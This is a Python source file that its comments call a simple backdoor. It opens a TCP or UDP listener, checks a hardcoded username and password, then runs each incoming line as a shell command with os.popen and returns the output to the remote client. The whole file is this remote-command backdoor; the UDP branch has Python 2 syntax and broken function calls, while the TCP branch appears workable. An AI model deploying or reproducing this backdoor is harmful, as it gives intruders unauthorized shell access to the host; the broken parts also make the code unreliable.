#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#  py3back1.py
#  
#  Copyright 2016 DockTownMayor <DockTownMayor@Host>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

# Small simplistic python backdoor.
# Features: ipv4/ipv6, udp/tcp, no encryption, authentication for tcp and udp, multi connection support, semi-interactive shell. No threads for upd!!
# 			args for username, protocol, host, port and ip version. All in order.

def tcpClient(connection, client_address, debug, interactive, bufferSize, encoding, username, password):
	status = 0
	auth = False
	d = ""
	l = ""
	try:
		if debug is True:
			print ("A new optimist has joined our ranks from " + client_address[0])
		while True:
			if auth is False and status >= 3:
				auth = True
			if auth is True:
				d = connection.recv(bufferSize)
			elif status is 0:
				connection.send(str("Who are you? ").encode(encoding))
				status += 1
			elif status is 1:
				d = connection.recv(bufferSize)
				d = str(d)[2:len(str(d)[1:])-4]
				connection.send(str("What's our secret? ").encode(encoding))
				status += 1
			elif status is 2:
				l = connection.recv(bufferSize)
				l = str(l)[2:len(str(l)[1:])-4]
				if ((password != l) or (username != d)):
					break;
				l = ""
				d = ""
				status += 1
			if status >= 3 and auth is True:
				if d:
					if "exit" in str(d):
						break
					elif "interactive" in str(d):
						if interactive is False:
							interactive = True
						else:
							interactive = False
					else:
						a = os.popen(str(d)[2:len(str(d)[1:])-4],"r") # Telnet is a bitch.
						if interactive is True:
							while True:
								l = a.readline()
								if not l: break
								connection.send(l.encode(encoding))
				else:
					if debug is True:
						print ("A moment of silence for our lost one from " + client_address[0])
					break
	except:
		if debug is True:
			print ("Unexpected error in a client thread!")
	finally: # Add an error handiing for when it crashes.
		connection.close()
	if status <= 2 and debug is True:
		print ("Someone failed to login as " + str(d) + " from " + client_address[0])
	elif debug is True:
		print ("One of our dear friends has just left us, he was from " + client_address[0])
	return 0

def findSession(ip, port, table):
	for i in xrange(len(table)): #either xrange ou avec len
		if table[i][0] == ip and table[i][1] == port:
			return True
	return False

def showAuthenticationSession(ip, port, table):
	if findSession(ip, port, table):
		for i in xrange(len(table)): #either xrange ou avec len
			if table[i][0] == ip and table[i][1] == port:
				return table[i][2]
	else:
		return False

def increaseAuthenticationSession(ip, port, table):
	tmptable = []
	for i in xrange(len(table)):
		if table[i][0] != ip and table[i][1] != port:
			tmptable[i] = [table[i][0], table[i][1], table[i][2]]
		else:
			tmptable[i] = [table[i][0], table[i][1], table[i][2]+1]
	return tmptable
	
def decreaseAuthenticationSession(ip, port, table):
	tmptable = []
	for i in xrange(len(table)):
		if table[i][0] != ip and table[i][1] != port:
			tmptable[i] = [table[i][0], table[i][1], table[i][2]]
		else:
			tmptable[i] = [table[i][0], table[i][1], table[i][2]-1]
	return tmptable

def addSession(ip, port, table):
	i = 0
	tmptable = []
	for i in xrange(len(table)):
		tmptable[i] = table[i]
	tmptable[i+1] = [ip, port, 0]
	return tmptable

def removeSession(ip, port, table):
	tmptable = []
	for i in xrange(len(table)):
		if table[i][0] != ip and table[i][1] != port:
			tmptable[i] = [table[i][0], table[i][1], table[i][2]]
	return tmptable

def main(args):
	protocol = "tcp"
	host = "127.0.0.1"
	port = 48379
	ipversion = 4
	username = "johndoe"
	debug = True
	if len(args) is 6:
		username = args[1]
		protocol = args[2]
		host = args[3]
		port = int(args[4])
		ipversion = int(args[5])
		debug = True
	interactive = True
	password = "unknown"
	bufferSize = 4096
	encoding = 'utf-8'
	afnet = socket.AF_INET6
	socku = socket.SOCK_STREAM
	
	# Session table
	sessions = []
	# Format: ip, port, authentication level.
	
	if ipversion is 4:
		host = "localhost"
		afnet = socket.AF_INET
	if "udp" in protocol:
		socku = socket.SOCK_DGRAM
	sock = socket.socket(afnet, socku)
	server_address = (host, port)
	sock.bind(server_address)
	if "udp" not in protocol:
		sock.listen(1)
	if debug is True:
		print ("Finding the light!")
	while True:
		if "udp" not in protocol:
			connection, client_address = sock.accept()
			try:
				_thread.start_new_thread(tcpClient, (connection, client_address, debug, interactive, bufferSize, encoding, username, password)) # I'm very lazy.
			except Exception as e:
				if debug is True:
					print >>sys.stderr, "Could not guide in the light: ", e
		else:
			try:
				while True:
					# Here we add a session management allowing us to handle authentication. Maybe adding select in it to speed it up?
					d, client_address = sock.recvfrom(bufferSize)
					if debug is True and findSession(client_address[0], client_address[1]) is False:
						print >>sys.stdout, "A new optimist has joined our ranks from ", client_address
						sessions = addSession(client_address[0], client_address[1])
					if showAuthenticationSession(client_address[0], client_address[1]) is 0:
						connection.send(str("Who are you? ").encode(encoding))
						increaseAuthenticationSession(client_address[0], client_address[1])
					elif showAuthenticationSession(client_address[0], client_address[1]) is 1 and d is username:
						connection.send(str("What's our secret? ").encode(encoding))
						increaseAuthenticationSession(client_address[0], client_address[1])
					elif showAuthenticationSession(client_address[0], client_address[1]) is 2 and d is password:
						increaseAuthenticationSession(client_address[0], client_address[1])
					elif d and showAuthenticationSession(client_address[0], client_address[1]) >= 3:
						if "exit" in d:
							sessions = removeSession(client_address[0], client_address[1])
							break
						if "interactive" in d:
							if interactive is False:
								interactive = True
							else:
								interactive = False
						a = os.popen(d,"r")
						if interactive is True:
							while True:
								l = a.readline()
								if not l: break
								connection.send(l.encode(encoding))
					else:
						if debug is True and findSession(client_address[0], client_address[1]) is True:
							print >>sys.stdout, "A moment of silence for our lost one from ", client_address
							sessions = removeSession(client_address[0], client_address[1])
						break
            
			finally:
				connection.close()
	if debug is True:
		print ("Going dark!")
	return 0

if __name__ == '__main__':
    import sys
    import socket
    import os
    import _thread
    sys.exit(main(sys.argv))
